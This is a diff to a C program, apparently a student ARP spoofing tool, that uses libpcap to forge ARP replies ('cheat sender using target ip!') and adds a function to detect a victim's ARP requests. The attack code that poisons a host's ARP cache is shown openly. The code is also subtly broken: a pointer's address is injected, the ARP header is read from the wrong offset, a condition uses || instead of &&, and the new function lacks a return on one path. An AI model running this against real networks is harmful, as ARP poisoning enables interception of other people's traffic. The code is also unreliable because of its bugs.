@@ -24,9 +24,9 @@ struct ARP_PACKET{
 };
 
 struct info{
-    char dev[10];
-    uint8_t sender_ip[4];
-    uint8_t target_ip[4];
+    uint32_t sender_ip;
+    uint32_t target_ip;
+    char interface[10];
 };
 #pragma pack(pop)
 
@@ -85,7 +85,7 @@ void Get_senderMAC(char* dev, uint8_t* senderIP, uint8_t* senderMAC){
     memcpy(&flush[28], localIP, 4);
     memset(&flush[32], 0x00, 6);
     memcpy(&flush[38], senderIP, 4);
-    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1000, errbuf);
     struct ARP_PACKET *arp_packet;
     arp_packet = (struct ARP_PACKET*)flush;
     pcap_inject(handle, (char*)&arp_packet, sizeof(struct ARP_PACKET));
@@ -119,9 +119,22 @@ void inject_ARP_sender(char* dev, uint8_t* senderIP ,uint8_t* targetIP, uint8_t*
     memcpy(&flush[28], targetIP, 4); //cheat sender using target ip!
     memcpy(&flush[32], senderMAC, 6);
     memcpy(&flush[38], senderIP, 4);
-    for (int i = 0; i < sizeof(flush); i++){
-        printf("%02X ", flush[i]);
-    }
-    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1, errbuf);
+    pcap_t* handle = pcap_open_live(dev, 1000, 1, 1000, errbuf);
     pcap_inject(handle, (u_char*)flush, sizeof (flush));
+    pcap_close(handle);
+}
+
+bool check_sender_request(u_char* packet, uint8_t* senderMAC){
+    struct ethernet_header etherH;
+    struct arp_header arpH;
+    u_char broad_dmac[6];
+    memset(broad_dmac, 0xFF, 6);
+    memcpy(&etherH, packet, 14);
+    memcpy(&arpH, packet, 8);
+    if(etherH.ether_type == 0x0806 || arpH.arp_opcode == ARPOP_REQUEST){
+        if(memcmp(etherH.ether_dhost, broad_dmac, 6) == 0 && memcmp(etherH.ether_shost, senderMAC, 6) == 0){
+            return true;
+        }
+    }
+
 }
